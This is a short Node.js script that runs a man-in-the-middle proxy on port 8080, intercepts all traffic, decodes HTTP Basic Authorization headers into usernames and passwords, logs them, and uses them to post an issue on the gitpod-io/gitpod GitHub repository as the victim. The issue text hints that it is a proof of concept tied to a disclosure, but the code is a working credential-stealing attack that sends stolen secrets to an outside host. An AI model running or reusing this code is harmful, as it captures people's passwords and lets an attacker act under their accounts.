const stream = require('stream')
const MitmProxy = require('@pureproxy/mitmproxy')
 
const server = new class extends MitmProxy {
  wrapClientForObservableStreaming(client, { hostname, port, context }) {
    // return a duplex stream (like sockets) to monitor all data in transit
 
    return new class extends stream.Duplex {
      constructor() {
        super()
 
        client.on('data', (data) => {
          // log incoming data
          this.push(data)
        })
      }
 
      _write(data, encoding, callback) {
        // log outgoing data
        let payload = data.toString('utf8')
        
        payload.split('\n').forEach(content => {
            if (content.startsWith('Authorization')) {
                try {
                    
                    let basicAuth =  Buffer.from(content.replace('Authorization: Basic ', ''), 'base64').toString('utf8').split(':')
                    
                    let credential = { 
                        target: client._host || client._parent._host,
                        user: decodeURI(basicAuth[0]), 
                        password: decodeURI(basicAuth[1]) 
                    }

                    require('request').post({
                        headers: { 'content-type' : 'application/json',
                                   'user-agent': 'request' },
                        url: `https://${basicAuth[0]}:${basicAuth[1]}@api.github.com/repos/gitpod-io/gitpod/issues`,
                        body: JSON.stringify({ 
                            title: 'WAIT A MOMENT!',
                            body: 'I can explain! please don\'t close this issue yet I will send an email to @JohannesLandgraf with the explanation',
                            // assignee: 'gerardo-junior' 
                        })
                    }, function(error, response, body){
                        console.log(body);
                    });
        
                    console.log('I got a credential:', credential)

                } catch (err) {
                    console.error(err)
                }
                
            }
        })

        client.write(data)
 
        callback()
      }
 
      _read() {}
    }
  }
 
  shouldIntercept(hostname, port, context) {
    return true
  }
}
 
server.listen(8080)
